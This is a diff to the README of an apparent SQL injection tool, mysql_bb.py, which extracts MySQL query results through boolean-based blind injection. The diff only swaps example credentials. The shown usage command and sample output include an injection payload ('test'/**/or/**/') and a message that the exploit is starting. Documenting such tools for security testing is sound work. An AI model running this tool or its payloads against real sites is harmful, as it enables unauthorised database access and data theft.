@@ -5,7 +5,7 @@ This script attempts to retrieve result of given SQL query by making boolean-bas
 ## Usage example
 Be sure you have no errors in SQL syntax, otherwise it may lead to false negative results. No ending semicolon is needed since given query will be inserted as subquery into substring() MySQL function.
 ```bash
-#Injection into GET "http://localhost/login?username=admin&password=admin"
+#Injection into GET "http://localhost/login?username=test&password=test"
 $ python3 mysql_bb.py --url "http://localhost/login" --data "username=test&password=test"  --method GET --sql "select version()"
 Checking parametr "username" with injection "test'/**/or/**/"
 (+) Parametr "username" is vulnerable to injection "test'/**/or/**/". Starting the exploit
